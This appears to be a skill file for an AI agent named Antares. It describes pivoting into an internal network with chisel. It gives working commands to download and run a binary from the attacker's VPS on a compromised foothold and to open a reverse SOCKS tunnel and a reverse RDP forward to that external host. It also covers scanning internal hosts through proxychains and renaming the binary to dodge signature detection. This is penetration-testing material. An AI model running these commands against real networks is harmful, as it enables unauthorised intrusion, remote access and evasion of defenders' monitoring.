---
name: chisel-tunnel
description: Pivot into an internal network with chisel over HTTP when SSH tunnelling is unavailable.
tags: [security, tunnel, pivot, chisel]
triggers: [chisel, tunnel, pivot, socks, internal]
---

# Chisel tunnel

Chisel tunnels TCP over HTTP, so it slips through egress filters that block
arbitrary ports. Use it when SSH is not an option on the foothold.

## Setup

1. **Server on your VPS** (`vps_run`):
   `chisel server -p 8080 --reverse --socks5`
2. **Client on the foothold** — pull the matching binary:
   `curl -O http://<vps-ip>:8000/chisel && chmod +x chisel`
   `./chisel client <vps-ip>:8080 R:socks`
3. You now have a SOCKS5 proxy on the VPS at `127.0.0.1:1080`.

## Use the pivot

- `proxychains4 nmap -sT -Pn -p 1-1000 <internal-host>`
- `proxychains4 curl http://<internal-host>/`
- Point the browser at the SOCKS proxy for internal web apps. In Antares, set
  the proxy on the `browser` tool or via `list_proxies`.

## Reverse port forward

`./chisel client <vps-ip>:8080 R:3389:10.0.0.5:3389` exposes an internal RDP
port on the VPS — useful for interactive access to a host with no route.

## Opsec

- Match the chisel binary to the foothold's architecture (`uname -m`).
- Rename the binary; `chisel` on disk is a signature.
- Clean up the binary when the engagement ends.
